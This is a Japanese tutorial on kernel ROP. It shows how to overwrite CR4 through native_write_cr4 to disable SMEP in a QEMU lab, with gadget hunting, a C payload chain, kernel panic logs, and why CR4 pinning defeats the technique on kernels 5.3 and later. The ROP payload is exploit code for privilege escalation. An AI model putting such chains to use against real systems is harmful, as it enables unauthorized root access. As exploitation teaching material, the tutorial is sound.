---
description: 古い手法
---

# Kernel ROP - Disabling SMEP

## Setup

[ret2usr](../../../types/kernel/kernel-rop-ret2usr.md) と同じ環境を使い、`run.sh` に変更を 1 つだけ加えます。

```bash
#!/bin/sh

qemu-system-x86_64 \
    -kernel bzImage \
    -initrd initramfs.cpio \
    -append "console=ttyS0 quiet loglevel=3 oops=panic nokaslr pti=off" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -smp cores=2 \
    -cpu qemu64,+smep \        # add this line
    -s
```

この状態で VM を読み込み、前回のエクスプロイトを実行すると、カーネルパニックになります。

<details>

<summary>Kernel Panic</summary>

```
[    1.628455] Yes? �U"��
[    1.628692] unable to execute userspace code (SMEP?) (uid: 1000)
[    1.631337] BUG: unable to handle page fault for address: 00000000004016b9
[    1.633781] #PF: supervisor instruction fetch in kernel mode
[    1.635878] #PF: error_code(0x0011) - permissions violation
[    1.637930] PGD 1296067 P4D 1296067 PUD 1295067 PMD 1291067 PTE 7c52025
[    1.639639] Oops: 0011 [#1] SMP
[    1.640632] CPU: 0 PID: 30 Comm: exploit Tainted: G           O       6.1.0 #6
[    1.646144] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.14.0-2 04/01/2014
[    1.647030] RIP: 0010:0x4016b9
[    1.648108] Code: Unable to access opcode bytes at 0x40168f.
[    1.648952] RSP: 0018:ffffb973400c7e68 EFLAGS: 00000286
[    1.649603] RAX: 0000000000000000 RBX: 00000000004a8220 RCX: 00000000ffffefff
[    1.650321] RDX: 00000000ffffefff RSI: 00000000ffffffea RDI: ffffb973400c7d08
[    1.651031] RBP: 0000000000000000 R08: ffffffffb7ca6448 R09: 0000000000004ffb
[    1.651743] R10: 000000000000009b R11: ffffffffb7c8f2e8 R12: ffffb973400c7ef8
[    1.652455] R13: 00007ffdfe225520 R14: 0000000000000000 R15: 0000000000000000
[    1.653218] FS:  0000000001b57380(0000) GS:ffff9c1b07800000(0000) knlGS:0000000000000000
[    1.654086] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.654685] CR2: 00000000004016b9 CR3: 0000000001292000 CR4: 00000000001006b0
[    1.655452] Call Trace:
[    1.656167]  <TASK>
[    1.656846]  ? do_syscall_64+0x3d/0x90
[    1.658073]  ? entry_SYSCALL_64_after_hwframe+0x46/0xb0
[    1.660144]  </TASK>
[    1.660835] Modules linked in: kernel_rop(O)
[    1.662360] CR2: 00000000004016b9
[    1.663362] ---[ end trace 0000000000000000 ]---
[    1.664702] RIP: 0010:0x4016b9
[    1.665386] Code: Unable to access opcode bytes at 0x40168f.
[    1.666167] RSP: 0018:ffffb973400c7e68 EFLAGS: 00000286
[    1.668501] RAX: 0000000000000000 RBX: 00000000004a8220 RCX: 00000000ffffefff
[    1.669777] RDX: 00000000ffffefff RSI: 00000000ffffffea RDI: ffffb973400c7d08
[    1.670710] RBP: 0000000000000000 R08: ffffffffb7ca6448 R09: 0000000000004ffb
[    1.672122] R10: 000000000000009b R11: ffffffffb7c8f2e8 R12: ffffb973400c7ef8
[    1.672795] R13: 00007ffdfe225520 R14: 0000000000000000 R15: 0000000000000000
[    1.673471] FS:  0000000001b57380(0000) GS:ffff9c1b07800000(0000) knlGS:0000000000000000
[    1.673854] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    1.674124] CR2: 00000000004016b9 CR3: 0000000001292000 CR4: 00000000001006b0
[    1.674576] Kernel panic - not syncing: Fatal exception
[    1.689999] Kernel Offset: 0x36200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[    1.695855] ---[ end Kernel panic - not syncing: Fatal exception ]---
```

</details>

今後のために、どのように見えるかを覚えておく価値があります。特に次の 3 行です。

```
[    1.628692] unable to execute userspace code (SMEP?) (uid: 1000)
[    1.631337] BUG: unable to handle page fault for address: 00000000004016b9
[    1.633781] #PF: supervisor instruction fetch in kernel mode
```

## Overwriting CR4

そこで、単にユーザー空間に戻るのではなく、CR4 を上書きしてみます。幸い、カーネルにはそのための非常に便利な関数があります。[`native_write_cr4(val)`](https://elixir.bootlin.com/linux/v6.1.96/source/arch/x86/kernel/cpu/common.c#L444) です。この関数は、文字どおり CR4 を上書きします。

KASLR がまだ無効であれば、(`init` を書き換えて root でログインするようにしている場合)`/proc/kallsyms` からこの関数のアドレスを取得できます。

```
~ # cat /proc/kallsyms | grep native_write_cr4
ffffffff8102b6d0 T native_write_cr4
```

この関数は `0xffffffff8102b6d0` にあります。では、CR4 を何に変更したいのでしょうか。上のカーネルパニックを見ると、次の行があります。

```
[    1.654685] CR2: 00000000004016b9 CR3: 0000000001292000 CR4: 00000000001006b0
```

CR4 は現在 `0x00000000001006b0` です。(最下位から数えて 0 始まりで)20 ビット目を取り除くと `0x6b0` になります。

最後に必要なのは、ガジェットを探すことです。そのためには、`bzImage` ファイルを `vmlinux` の ELF ファイルに変換して、`ropper` や `ROPgadget` を実行できるようにする必要があります。公式の Linux の git リポジトリにある [`extract-vmlinux`](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux) を実行すれば変換できます。

```bash
$ ./extract-vmlinux bzImage > vmlinux
$ file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=3003c277e62b32aae3cfa84bb0d5775bd2941b14, stripped
```

```bash
$ ropper -f vmlinux --search "pop rdi"
0xffffffff811e08ec: pop rdi; ret;
```

### Putting it all together

エクスプロイトで変わるのは、オーバーフローの部分だけです。

```c
// overflow
uint64_t payload[20];

int i = 6;

payload[i++] = 0xffffffff811e08ec;      // pop rdi; ret
payload[i++] = 0x6b0;
payload[i++] = 0xffffffff8102b6d0;      // native_write_cr4
payload[i++] = (uint64_t) escalate;

write(fd, payload, 0);
```

あとはコンパイルして実行します。

## Failure

これは失敗します。なぜでしょうか。

結果のカーネルパニックを見ると、おなじみの行が現れます。

```
[    1.542923] unable to execute userspace code (SMEP?) (uid: 0)
[    1.545224] BUG: unable to handle page fault for address: 00000000004016b9
[    1.547037] #PF: supervisor instruction fetch in kernel mode
```

SMEP がまた有効になっています。どうしてでしょうか。[エクスプロイトをデバッグ](../../../types/kernel/debugging-a-kernel-module.md)すると、ガジェットも `native_write_cr4()` の呼び出しも、確かに実行されています。何が起きているのでしょうか。

[ソース](https://elixir.bootlin.com/linux/v6.1.96/source/arch/x86/kernel/cpu/common.c#L444)を見ると、別の機能があります。

```c
void __no_profile native_write_cr4(unsigned long val)
{
	unsigned long bits_changed = 0;

set_register:
	asm volatile("mov %0,%%cr4": "+r" (val) : : "memory");

	if (static_branch_likely(&cr_pinning)) {
		if (unlikely((val & cr4_pinned_mask) != cr4_pinned_bits)) {
			bits_changed = (val & cr4_pinned_mask) ^ cr4_pinned_bits;
			val = (val & ~cr4_pinned_mask) | cr4_pinned_bits;
			goto set_register;
		}
		/* Warn after we've corrected the changed bits. */
		WARN_ONCE(bits_changed, "pinned CR4 bits changed: 0x%lx!?\n",
			  bits_changed);
	}
}
```

要するに、入力した `val` が、`cr4_pinned_bits` で定義されたビットのどれかを無効にしていないかを確認します。この値は[起動時に設定され](https://elixir.bootlin.com/linux/v6.1.96/source/arch/x86/kernel/cpu/common.c#L507)、「センシティブな CR ビット」が変更されるのを防ぎます。変更されると、それらは **元に戻されます**。事実上、CR4 の変更はもう通用せず、[バージョン 5.3-rc1](https://elixir.bootlin.com/linux/v5.3-rc1/source/arch/x86/kernel/cpu/common.c#L431) 以降ずっとそうなっています。
